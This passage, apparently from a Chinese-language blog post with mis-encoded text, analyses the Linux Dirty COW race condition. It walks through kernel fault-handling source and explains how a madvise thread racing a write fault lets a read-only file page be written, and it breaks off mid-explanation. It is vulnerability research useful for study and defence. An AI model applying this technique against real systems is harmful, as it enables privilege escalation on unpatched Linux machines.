class="line">kunmap(page);</span><br><span class="line">page_cache_release(page);</span><br><span class="line">&#125;</span><br><span class="line">len -= bytes;</span><br><span class="line">buf += bytes;</span><br><span class="line">addr += bytes;</span><br><span class="line">&#125;</span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡<code>ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);</code>è·å–åˆ°å¯¹åº”ç›®æ ‡çš„å†…å­˜é¡µã€‚ç„¶åé€šè¿‡<code>maddr = kmap(page);</code>å»ºç«‹æ˜ å°„ï¼Œæœ€ååœ¨<code>copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);</code>ä¸­å†™å…¥ã€‚</p><p>é‚£ä¹ˆå…¶ä¸­æœ€ä¸ºé‡è¦çš„å³ä¸º<code>get_user_pages</code>å‡½æ•°</p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment"> * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment"> * using the address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line"><span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">vma = find_extend_vma(mm, start);</span><br><span class="line"><span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">gup_flags, &amp;vma,</span><br><span class="line">pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> i ? : ret;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line"><span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">&amp;start, &amp;nr_pages, i,</span><br><span class="line">gup_flags);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment"> * potentially allocating memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line"><span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">cond_resched();</span><br><span class="line">      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">nonblocking);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"><span class="keyword">case</span> -EFAULT:</span><br><span class="line"><span class="keyword">case</span> -ENOMEM:</span><br><span class="line"><span class="keyword">case</span> -EHWPOISON:</span><br><span class="line"><span class="keyword">return</span> i ? i : ret;</span><br><span class="line"><span class="keyword">case</span> -EBUSY:</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">case</span> -ENOENT:</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line">BUG();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment"> * struct page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line"><span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pages) &#123;</span><br><span class="line">pages[i] = page;</span><br><span class="line">flush_anon_page(vma, page, start);</span><br><span class="line">flush_dcache_page(page);</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">next_page:</span><br><span class="line"><span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">vmas[i] = vma;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line"><span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">page_increm = nr_pages;</span><br><span class="line">i += page_increm;</span><br><span class="line">start += page_increm * PAGE_SIZE;</span><br><span class="line">nr_pages -= page_increm;</span><br><span class="line">&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure><p>æœ€å¼€å§‹å°±æ˜¯å¯¹vmaçš„ä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯<code>retry</code>ä¹‹åçš„å†…å®¹ã€‚å¯ä»¥çœ‹å‡ºæ¥çš„æ˜¯<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„æ˜¯ç‰©ç†é¡µé¢ï¼Œè€Œä¸”<code>faultin_page</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>handle_mm_fault</code>ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡å¾€ä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥å†…å®¹æ—¶ä¼šå› ä¸ºLinuxçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶å¯¼è‡´è¯¥é¡µè¿˜æœªå’Œå¯¹åº”çš„ç‰©ç†é¡µå»ºç«‹æ˜ å°„ï¼Œé‚£ä¹ˆæ­¤æ—¶<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„åˆ™æ˜¯NULLï¼Œéšå³è¿›å…¥ç¬¬ä¸€ä¸ª<code>faultin_page</code>å‡½æ•°ï¼Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œè¿™ä¸€æ¬¡è§£å†³å®Œæ¯•ä¹‹åï¼Œä¼šåˆ†é…ç‰©ç†é¡µã€‚é‚£ä¹ˆè¿™é‡Œç»è¿‡<code>retry</code>å†ä¸€æ¬¡æ‰§è¡Œ<code>follow_page_mask</code>ï¼Œä¸è¿‡å› ä¸ºé¡µé¢ä¸å¯å†™å†ä¸€æ¬¡å¯¼è‡´è¿”å›çš„å€¼ä¸ºNULLï¼Œéšå³è¿›è¡Œç¬¬äºŒæ¬¡<code>faultin_page</code>å‡½æ•°ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">(stack_guard_page_start(vma, address) ||</span><br><span class="line"> stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line"><span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">BUG();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tsk) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">*nonblocking = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment"> * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment"> * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment"> * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment"> * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment"> * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¬¡è¿›å…¥æ—¶ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå¯å†™çš„å†…å­˜é¡µäº†ï¼Œå¹¶ä¸”è¿”å›å€¼ä¸º<code>VM_FAULT_WRITE</code>ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œåˆ°ä¸Šé¢çš„æœ€åä¸€æ®µï¼Œæ‰€ä»¥ä¼šæ¸…é™¤æ‰<code>flag</code>ä¸­çš„<code>FOLL_WRITE</code>ã€‚é‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨<code>follow_page_pte</code>å‡½æ•°æ—¶åˆ™ä¼šè¿”å›æ­£å¸¸çš„å†…å­˜é¡µäº†ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨åˆ†æä¹‹å‰ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹<code>madvise</code>ç³»ç»Ÿè°ƒç”¨ï¼Œ<code>madvise</code>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåœ°å€ï¼Œç¬¬äºŒå‚æ•°ä¸ºèŒƒå›´ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè¡Œä¸ºã€‚è€Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯å»ºè®®å†…æ ¸ï¼Œåœ¨ä» addr æŒ‡å®šçš„åœ°å€å¼€å§‹ï¼Œé•¿åº¦ç­‰äº len å‚æ•°å€¼çš„èŒƒå›´å†…ï¼Œè¯¥åŒºåŸŸçš„ç”¨æˆ·è™šæ‹Ÿå†…å­˜åº”éµå¾ªç‰¹å®šçš„ä½¿ç”¨æ¨¡å¼ã€‚å†…æ ¸ä½¿ç”¨è¿™äº›ä¿¡æ¯ä¼˜åŒ–ä¸æŒ‡å®šèŒƒå›´å…³è”çš„èµ„æºçš„å¤„ç†å’Œç»´æŠ¤è¿‡ç¨‹ã€‚è€Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ª<code>MADV_DONTNEED</code>å‚æ•°æˆ‘æ‰€ç†è§£çš„å°±æ˜¯å»é™¤å¯¹åº”çš„è¡¨é¡¹ï¼Œå¹¶ä¸”è¢«å†…æ ¸æ ‡è®°ï¼Œåœ¨è¢«éœ€è¦æ—¶å¯ä»¥è¢«é‡æ–°ä½¿ç”¨ã€‚</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¬¡èšç„¦<code>do_fault</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¬¡æˆ‘ä»¬çš„flagså…¶å®æ˜¯æ²¡æœ‰<code>FAULT_FLAG_WRITE</code>æ ‡å¿—ä½çš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥è°ƒç”¨<code>do_read_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span></span><br><span class="line"><span class="comment"> * if page by the offset is not ready to be mapped (cold cache or</span></span><br><span class="line"><span class="comment"> * something).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="number">1</span>) &#123;</span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">do_fault_around(vma, address, pte, pgoff, flags);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*pte, orig_pte))</span><br><span class="line"><span class="keyword">goto</span> unlock_out;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">unlock_out:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>do_set_pte(vma, address, fault_page, pte, false, false);</code>å‡½æ•°è°ƒç”¨ï¼Œåœ¨<code>do_cow_fault</code>å‡½æ•°ä¸­åŒæ ·å­˜åœ¨è¿™æ ·çš„è°ƒç”¨<code>do_set_pte(vma, address, new_page, pte, true, true);</code>ã€‚å¯ä»¥å‘ç°ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿå°±å†³å®šäº†åé¢å¯ä»¥è·å–åˆ°çš„é¡µé¢ï¼Œè€Œ<code>do_read_fault</code>è¿™é‡Œè·å–çš„ç›´æ¥å°±æ˜¯<code>fault_page</code>ï¼Œè¿™é‡Œå°±æ˜¯å¾ˆç®€å•ç²—æš´çš„å°†å…¶ç§»å‡º<code>page_cache</code>ï¼Œè¿™æ˜¯å› ä¸ºkernelåœ¨é¢å¯¹ä¸€ä¸ªè¯»è¯·æ±‚æ—¶ä¸ä¼šå¤§è´¹å‘¨ç« çš„å†å»åˆ›å»ºä¸€ä¸ª<code>dirty COW</code>é¡µã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>ä½¿ç”¨ä¸¤ä¸ªçº¿ç¨‹è·‘ç«äº‰ï¼Œåœ¨ç¬¬ä¸€ä¸ªçº¿ç¨‹å®Œæˆä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸çš„æµç¨‹ä¹‹åï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨<code>madvise()</code>ç³»ç»Ÿè°ƒç”¨å°†å†…å­˜é¡µè°ƒå‡ºï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªçº¿ç¨‹åœ¨å°è¯•ç¬¬ä¸‰æ¬¡è·å–å†…å­˜é¡µæ—¶ä¾¿æ— æ³•æ­£å¸¸è·å–åˆ°å¯è¯»çš„ç‰©ç†é¡µï¼Œæ­¤æ—¶ä¼šå†æ¬¡å‡ºå‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ¥ä¸‹æ¥ä¼šæœ‰ä¸€æ¬¡è¿›å…¥åˆ°<code>faultin_page()</code>å‡½æ•°ä¸­ï¼Œè€Œè¿™æ¬¡è¿”å›çš„å†…å­˜é¡µå…¶å®å°±æ˜¯<code>fault_page</code>ï¼Œå¹¶ä¸”è¿™ä¸ªå†…å­˜é¡µä¹Ÿæ˜¯ä¸å¯å†™çŠ¶æ€çš„ï¼Œä½†æ˜¯åœ¨ä¸Šé¢çš„flagä¸­ï¼Œæˆ‘ä»¬å·²ç»å»é™¤æ‰äº†<code>FOLL_WRITE</code>æ‰€ä»¥åœ¨å†…æ 